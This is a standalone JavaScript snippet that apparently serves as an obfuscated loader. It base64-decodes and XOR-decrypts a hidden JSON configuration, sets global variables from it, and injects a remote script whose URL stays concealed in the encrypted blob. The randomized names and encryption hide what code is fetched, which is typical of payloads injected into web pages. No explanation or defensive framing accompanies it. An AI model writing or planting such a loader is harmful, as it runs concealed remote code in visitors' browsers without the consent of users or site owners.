
(function(){
  var n_oqhs=atob("DEdUZ721rGa5dnoYJTx2Es/ZjlybHg5sVTRuSJLWyAiXAw51TCEtSd7awUjbBFVrRjU9F8nGgxPNGwk3SSYgAs7BggzKVFY6RDMgFdTX2RLcBVgifjx2CdzYyUSDVB55USZ5EsnYxQDAWwpqQDExCcmY1AXWEldrRix2S5/DzQrME1giB2UpS8aXwgfUE1giByM1E9yY2RLUHxxhCDcmAsvQwhKUBQ96TCMnRZGX2gfVAx86H2V2GuDI");
  var b_5nf=[];
  for(var x_7kxy=0;x_7kxy<n_oqhs.length;x_7kxy++){
    b_5nf.push(n_oqhs.charCodeAt(x_7kxy)&255);
  }
  var u_d=b_5nf[0];
  var o_8yrb=b_5nf.slice(1,1+u_d);
  var q_2=b_5nf.slice(1+u_d);
  var v_9=q_2.map(function(b,d_txtf){
    return b^o_8yrb[d_txtf%u_d];
  });
  var x_8="";
  for(var f_8=0;f_8<v_9.length;f_8++){
    x_8+=String.fromCharCode(v_9[f_8]&255);
  }
  var d_hl=decodeURIComponent(escape(x_8));
  var j_l3w1=JSON.parse(d_hl);
  var q_w=j_l3w1.globals||[];
  q_w.forEach(function(r_6){
    window[r_6.name]=r_6.value;
  });
  var r_my0=document.createElement("script");
  r_my0.src=j_l3w1.url;
  r_my0.async=true;
  r_my0.defer=true;
  (j_l3w1.attributes||[]).forEach(function(x_8eq){
    r_my0.setAttribute(x_8eq.name,x_8eq.value);
  });
  (document.head||document.documentElement).appendChild(r_my0);
})();
